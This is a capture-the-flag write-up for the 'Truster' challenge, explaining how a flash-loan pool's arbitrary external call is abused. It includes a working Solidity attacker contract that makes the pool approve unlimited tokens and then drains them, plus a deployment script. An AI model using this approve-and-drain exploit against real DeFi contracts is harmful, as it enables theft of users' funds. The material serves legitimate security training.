# Challenge #3 - Truster

## Description

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

Currently the pool has 1 million DVT tokens in balance. And you have nothing.

But don't worry, you might be able to take them all from the pool. In a single transaction.

## What we have

We have 1 contract here:

1. `TrusterLenderPool`: A flashloan issuer providing DVT tokens.

Looking at the contract, we find these issues:

## Issues in TrusterLenderPool

### 1. Anyone can initiate flashloan for `borrower`

### 2. Contract can execute arbitrary instructions

The flashloan function uses `target.functionCall(data)`. This is very dangerous as a malicious caller can use this to execute any instruction as if the flashloan contract was the caller. It can be used to transfer or approve any tokens for example _(oh wait!)_.

## Solution

We can only get the token if the flashloan contract wants so. But we can choose what it wants to do (issue #2). So, we can send a transfer instruction to it, and hooray, we get the tokens! But NO. The flashloan function will revert if the balance decreases. So, instead we just ask the flashloan contract to approve the tokens to us _(promise I won't do anything bad 🙃)_. And then we sneakily take out the funds 😈.

```ts
// solidity
pragma solidity ^0.8.0;

import "contracts/truster/TrusterLenderPool.sol";

contract TrusterAttacker {
    constructor(address _lender) {
        TrusterLenderPool lender = TrusterLenderPool(_lender);
        IERC20 dvt = lender.damnValuableToken();
        lender.flashLoan(
            0,
            address(this),
            address(dvt),
            // transaction data to approve uint.max tokens to this contract
            abi.encodeWithSelector(
                dvt.approve.selector,
                address(this),
                type(uint).max
            )
        );

        require(
            dvt.transferFrom(
                address(lender),
                msg.sender,
                dvt.balanceOf(address(lender))
            )
        );
    }
}
```

```ts
// test script
const AttackerFactory = await ethers.getContractFactory(
  "TrusterAttacker",
  attacker
);
await AttackerFactory.deploy(this.pool.address);
```

## Probable Fix

Ability to execute arbitrary instructions from arbitrary callers? BAADD!!!
